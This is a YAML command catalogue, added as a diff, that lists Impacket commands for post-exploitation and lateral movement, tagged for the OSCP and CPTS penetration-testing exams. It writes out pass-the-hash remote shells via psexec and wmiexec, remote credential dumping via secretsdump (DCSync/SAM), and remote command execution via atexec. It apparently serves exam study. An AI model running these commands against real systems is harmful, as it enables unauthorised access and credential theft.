@@ -1,0 +1,51 @@
+category: "impacket"
+description: "Impacket post-exploitation and lateral movement"
+commands:
+  - name: "smbserver-share"
+    description: "Start SMB server to host files"
+    command: "impacket-smbserver share . -smb2support -user {USER} -password {PASSWORD}"
+    tool: "impacket"
+    tags: ["ad", "smb", "transfer", "host"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Execute on Kali. Access from Windows via \\\\{LHOST}\\share"
+
+  - name: "psexec-pth"
+    description: "PsExec with Pass-the-Hash"
+    command: "impacket-psexec {DOMAIN}/{USER}@{IP} -hashes :{HASH}"
+    tool: "impacket"
+    tags: ["ad", "pth", "move", "shell"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "wmiexec-pth"
+    description: "WMIExec with Pass-the-Hash (Stealthier)"
+    command: "impacket-wmiexec {DOMAIN}/{USER}@{IP} -hashes :{HASH}"
+    tool: "impacket"
+    tags: ["ad", "pth", "move", "shell", "wmi"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "secretsdump-remote"
+    description: "Dump hashes remotely (DCSync/SAM)"
+    command: "impacket-secretsdump {DOMAIN}/{USER}:{PASSWORD}@{IP}"
+    tool: "impacket"
+    tags: ["ad", "dump", "hash", "dcsync"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "mssql-client"
+    description: "Connect to MSSQL database"
+    command: "impacket-mssqlclient {DOMAIN}/{USER}:{PASSWORD}@{IP} -windows-auth"
+    tool: "impacket"
+    tags: ["ad", "mssql", "db", "connect"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "atexec-cmd"
+    description: "Execute single command via Task Scheduler"
+    command: "impacket-atexec {DOMAIN}/{USER}:{PASSWORD}@{IP} 'whoami'"
+    tool: "impacket"
+    tags: ["ad", "exec", "task", "scheduler"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
